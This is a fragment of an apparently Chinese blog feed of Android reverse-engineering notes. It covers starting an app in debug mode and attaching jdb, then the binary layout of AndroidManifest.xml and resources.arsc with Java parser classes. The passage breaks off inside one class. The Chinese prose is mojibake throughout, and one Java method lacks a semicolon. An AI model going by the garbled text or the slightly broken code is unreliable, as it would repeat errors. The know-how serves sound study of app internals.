&lt;h3 id="0x02-æ–¹æ³•äºŒ">0x02 æ–¹æ³•äºŒ&lt;/h3>
&lt;p>æ— æ³•åŠ è½½soæ–‡ä»¶éœ€è¦åœ¨åŠ è½½ä¹‹å‰æ–­ç‚¹ã€‚åè°ƒè¯•ä¹‹ç±»&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Debugæ–¹å¼å¯åŠ¨appã€‚éœ€è¦åº”ç”¨å¯è°ƒè¯•å¼€å¯&lt;/p>
&lt;p>&lt;code>adb shell am start -D -n åŒ…å/.MainActivity&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ–¹æ³•ä¸€çš„1ï¼Œ2ä¸¤æ­¥ å‹¾é€‰é€‰é¡¹ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jdb attachç¨‹åº&lt;/p>
&lt;p>&lt;code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¼€å§‹è°ƒè¯• åŒä¸Š&lt;/p>
&lt;/li>
&lt;/ol></description></item><item><title>Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡5-6</title><link>https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/</link><pubDate>Wed, 29 Aug 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/</guid><description>&lt;h1 id="androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡5-6">Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡5-6&lt;/h1>
&lt;h2 id="ä¸€-åŸºç¡€ç¯‡-">ä¸€ã€ åŸºç¡€ç¯‡â‘¤-â‘¥&lt;/h2>
&lt;p>è¿™ä¸¤ç« ä¸»è¦æè¿°AndroidManifest.xmlå’Œresourec.arscè¿™ä¸¤ä¸ªandroidæ–‡ä»¶ã€‚å†…å®¹ä¸æ˜¯å¾ˆå¤šï¼Œä¸‹é¢æ˜¯ä¸¤ç« çš„ç¬”è®°ã€‚&lt;/p>
&lt;h3 id="ç¬¬äº”ç« -androidmanifestxmlæ ¼å¼è§£æ">ç¬¬äº”ç«  AndroidManifest.xmlæ ¼å¼è§£æ&lt;/h3>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180829165213.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>AndroidManifest.xml&lt;/p>
&lt;p>AndroidManifest.xmlæ–‡ä»¶æ ¼å¼å›¾&lt;/p>
&lt;h3 id="å¤´éƒ¨ä¿¡æ¯">å¤´éƒ¨ä¿¡æ¯&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>æ–‡ä»¶é­”æ•°ï¼š4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ–‡ä»¶å¤§å°ï¼š4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Chunkå†…å®¹ å¤´éƒ¨ç›¸åŒï¼ˆChunkType(4bytes)ã€ChunkSize(4bytes)ï¼‰ã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Sting Chunk&lt;/strong> ï¼šä¸»è¦ç”¨äºå­˜æ”¾AndroidManifest.xmlæ–‡ä»¶ä¸­æ‰€æœ‰çš„å­—ç¬¦ä¸²ä¿¡æ¯ã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ChunkTypeï¼šç±»å‹ï¼Œå›ºå®š4bytesï¼ˆ0x001C001)ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ChunkSizeï¼šå¤§å°ï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>StringCountï¼šå­—ç¬¦ä¸²çš„ä¸ªæ•° ï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>StyleCount ï¼šæ ·å¼çš„ä¸ªæ•°ï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Unknown ï¼šä½ç½®åŒºåŸŸã€‚4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>StringPoolOffset ï¼šå­—ç¬¦ä¸²æ± çš„åç§»å€¼ã€‚4bytesã€‚åç§»å€¼ç›¸å¯¹äºStringChunkå¤´éƒ¨çš„ä½ç½®ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>StylePoolOffset : æ ·å¼æ± çš„åç§»å€¼ã€‚4bytesã€‚æ²¡æœ‰Styleå¯å¿½ç•¥ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>StringOffsets ï¼šæ¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„åç§»å€¼ï¼Œå¤§å°ä¸ºStringChunk*4ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>StyleOffsetsï¼šæ¯ä¸ªæ ·å¼çš„åç§»å€¼ï¼Œå¤§å°ä¸ºStyleChunk*4ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>å¦‚ä½•è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Ÿ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Resourceld Chunk&lt;/strong> ï¼šä¸»è¦ç”¨æ¥å­˜æ”¾AndroidManifest ä¸­ç”¨åˆ°çš„ç³»ç»Ÿå±æ€§å€¼å¯¹åº”çš„èµ„æºID&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ChunkTypeï¼šç±»å‹ï¼Œå›ºå®š4bytesï¼ˆ0x00080108ï¼‰ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ChunkSizeï¼šå¤§å°ï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ResourceIds : å†…å®¹ï¼Œå¤§å°ä¸ºResourceld Chunkå¤§å°é™¤ä»¥4å‡å»å¤´éƒ¨çš„8å­—èŠ‚ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>è§£æï¼Ÿ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Start Namespace Chunk&lt;/strong>ï¼šä¸»è¦åŒ…å«äº†AndroidMaifestæ–‡ä»¶ä¸­çš„å‘½åç©ºé—´çš„å†…å®¹ï¼Œandroidä¸­çš„xmléƒ½æ˜¯é‡‡ç”¨Schemaæ ¼å¼ï¼ˆä¸¤ç§æ ¼å¼DTDå’ŒSchemaï¼‰çš„ï¼Œæ‰€æœ‰è‚¯å®šæœ‰Prefixå’ŒURIã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Chunk Typeï¼šç±»å‹ï¼Œå›ºå®š4bytesã€‚ï¼ˆ0x00100100)ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Chunk Sizeï¼šå¤§å°ï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Line Number ï¼šAndroidMaifestæ–‡ä»¶ä¸­è¡Œå·ï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Unknownï¼šæœªçŸ¥åŒºåŸŸ,4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Prefixï¼šå‘½åç©ºé—´çš„å‰ç¼€ï¼ˆåœ¨å­—ç¬¦ä¸²ä¸­çš„ç´¢å¼•å€¼ï¼‰ï¼Œeg:&lt;code>android&lt;/code>ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Uriï¼šå‘½åç©ºé—´çš„URIï¼ˆåœ¨å­—ç¬¦ä¸²ä¸­çš„ç´¢å¼•å€¼ï¼‰ï¼Œeg:&lt;code>http://schemas.android.com/apk/res/android&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Start Tag Chunk&lt;/strong>ï¼šAndroidMaifest.xmlçš„æ ‡ç­¾ä¿¡æ¯ï¼Œæœ€æ ¸å¿ƒçš„å†…å®¹ï¼Œä¹Ÿæ˜¯æœ€å¤æ‚çš„å†…å®¹ã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Chunk Typeï¼šç±»å‹ï¼Œå›ºå®š4bytesã€‚ï¼ˆ0x00100102)ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Chunk Sizeï¼šå¤§å°ï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Line Number ï¼šå¯¹åº”AndroidMaifestä¸­çš„è¡Œå·ï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Unknownï¼šæœªçŸ¥åŒºåŸŸ,4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Namespace Uri ï¼šå‘½åç©ºé—´çš„Uriï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Nameï¼šæ ‡ç­¾åç§°ï¼ˆåœ¨å­—ç¬¦ä¸²ä¸­çš„ç´¢å¼•å€¼ï¼‰ï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Flagsï¼šæ ‡ç­¾çš„ç±»å‹ï¼Œ4bytesã€‚egï¼šæ˜¯å¼€å§‹æ ‡ç­¾è¿˜æ˜¯ç»“æŸæ ‡ç­¾ï¼Ÿ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Attributes Counkï¼šä¾¿ç­¾ä¸­åŒ…å«çš„å±æ€§çš„ä¸ªæ•°ï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Class Attributeï¼šæ ‡ç­¾åŒ…å«çš„ç±»å±æ€§ï¼Œ4bytesã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Attributes ï¼šå±æ€§å†…å®¹ï¼Œæ¯ä¸ªå±æ€§ç®—æ˜¯ä¸€ä¸ªEntryï¼ŒEntryæ˜¯ä¸€ä¸ªå¤§å°5çš„å­—èŠ‚æ•°ç»„[Namespace,URI,Name,ValueString,Data]ï¼Œå¤§å°ä¸ºâ€å±æ€§ä¸ªæ•°* 5 *4&amp;quot;ä¸ªå­—èŠ‚ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="axmlprinterå·¥å…·">AXMLPrinterå·¥å…·&lt;/h3>
&lt;h3 id="aapt-å·¥å…·">aapt å·¥å…·&lt;/h3>
&lt;h3 id="ç¬¬å…­ç« -resourecarscæ–‡ä»¶æ ¼å¼è§£æ">ç¬¬å…­ç«  resourec.arscæ–‡ä»¶æ ¼å¼è§£æ&lt;/h3>
&lt;h3 id="èµ„æºæ–‡ä»¶idæ ¼å¼">èµ„æºæ–‡ä»¶idæ ¼å¼&lt;/h3>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180829200453.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180829200408.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>resourec.arscæ–‡ä»¶æ ¼å¼&lt;/p>
&lt;h3 id="æ•°æ®ç»“æ„">æ•°æ®ç»“æ„&lt;/h3>
&lt;p>ä¸Šå›¾&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>å¤´éƒ¨ä¿¡æ¯&lt;/strong>&lt;/p>
&lt;p>resourec.arscæ–‡ä»¶æ ¼å¼ç”±ä¸€ç³»åˆ—chunkç»„æˆï¼Œæ¯ä¸€ä¸ªchunkå‡åŒ…å«ä¸€ä¸ªResChunk_header&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">ResChunkHeader&lt;/span>&lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">short&lt;/span> &lt;span class="n">type&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//å½“å‰chunkçš„ç±»å‹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">short&lt;/span> &lt;span class="n">headerSize&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//å½“å‰chunkçš„å¤´éƒ¨å¤§å°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//å½“å‰chunkçš„å¤§å°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">getHeaderSize&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">toString&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;type:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">Utils&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">bytesToHexString&lt;/span>&lt;span class="o">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Utils&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">int2Byte&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="o">))+&lt;/span>&lt;span class="s">&amp;#34;,headerSize:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">headerSize&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,size:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">size&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>èµ„æºç´¢å¼•è¡¨çš„å¤´éƒ¨ä¿¡æ¯&lt;/strong>&lt;/p>
&lt;p>resourec.arscçš„ç¬¬ä¸€ä¸ªç»“æ„ï¼Œç»“æ„æè¿°äº†Resource.arscæ–‡ä»¶çš„å¤§å°å’Œèµ„æºåŒ…æ•°é‡ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">ResTableHeader&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">ResChunkHeader&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//å°±æ˜¯æ ‡å‡†çš„Chunkå¤´éƒ¨ä¿¡æ¯æ ¼å¼
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">packageCount&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//è¢«ç¼–è¯‘çš„èµ„æºåŒ…çš„ä¸ªæ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="nf">ResTableHeader&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ResChunkHeader&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">getHeaderSize&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getHeaderSize&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">4&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">toString&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;header:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">()+&lt;/span>&lt;span class="s">&amp;#34;\n&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34;packageCount:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">packageCount&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180829204728.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>èµ„æºé¡¹çš„å€¼å­—ç¬¦ä¸²èµ„æºæ± &lt;/strong>æ¥ç€å¤´éƒ¨çš„çš„æ˜¯ä¸¤ä¸ªåç§»æ•°ç»„ï¼Œåˆ†åˆ«æ˜¯å­—ç¬¦ä¸²åç§»æ•°ç»„å’Œå­—ç¬¦ä¸²æ ·å¼åç§»æ•°ç»„ã€‚è¿™ä¸¤ä¸ªåç§»æ•°ç»„çš„å¤§å°åˆ†åˆ«ç­‰äºstringCountå’ŒstyleCountçš„å€¼ï¼Œè€Œæ¯ä¸€ä¸ªå…ƒç´ çš„ç±»å‹éƒ½æ˜¯æ— ç¬¦å·æ•´å‹ã€‚æ•´ä¸ªå­—ç¬¦ä¸­èµ„æºæ± ç»“æ„å¦‚ä¸‹ã€‚&lt;/p>
&lt;p>åŒ…å«äº†æ‰€æœ‰åœ¨èµ„æºåŒ…é‡Œé¢å®šä¹‰çš„èµ„æºé¡¹çš„å€¼å­—ç¬¦ä¸²ï¼Œç»“æ„å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">ResStringPoolHeader&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">ResChunkHeader&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//æ ‡å‡†çš„Chunkå¤´éƒ¨ä¿¡æ¯ç»“æ„
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">stringCount&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//å­—ç¬¦ä¸²çš„ä¸ªæ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">styleCount&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//å­—ç¬¦ä¸²æ ·å¼çš„ä¸ªæ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">SORTED_FLAG&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">1&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">UTF8_FLAG&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="n">8&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//å­—ç¬¦ä¸²çš„å±æ€§,å¯å–å€¼åŒ…æ‹¬0x000(UTF-16),0x001(å­—ç¬¦ä¸²ç»è¿‡æ’åº)ã€0X100(UTF-8)å’Œä»–ä»¬çš„ç»„åˆå€¼
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">stringsStart&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//å­—ç¬¦ä¸²å†…å®¹å—ç›¸å¯¹äºå…¶å¤´éƒ¨çš„è·ç¦»
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">stylesStart&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">//å­—ç¬¦ä¸²æ ·å¼å—ç›¸å¯¹äºå…¶å¤´éƒ¨çš„è·ç¦»
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="nf">ResStringPoolHeader&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ResChunkHeader&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">getHeaderSize&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getHeaderSize&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">4&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
